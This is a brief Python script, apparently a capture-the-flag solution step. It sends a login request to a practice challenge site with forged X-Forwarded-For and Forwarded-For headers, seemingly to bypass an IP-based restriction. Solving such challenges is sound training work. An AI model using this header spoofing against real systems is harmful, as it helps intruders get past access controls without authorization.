import requests

target = 'https://xssrf.hackme.inndy.tw/login.php'
headers = {
    'X-Forwarded-For': '0.0.0.0',
    'Forwarded-For': '0.0.0.0'
}

s = requests.session()
r = s.post(target, data={
    'username': 'test',
    'password': 'test'
}, headers=headers)
print(r.text)
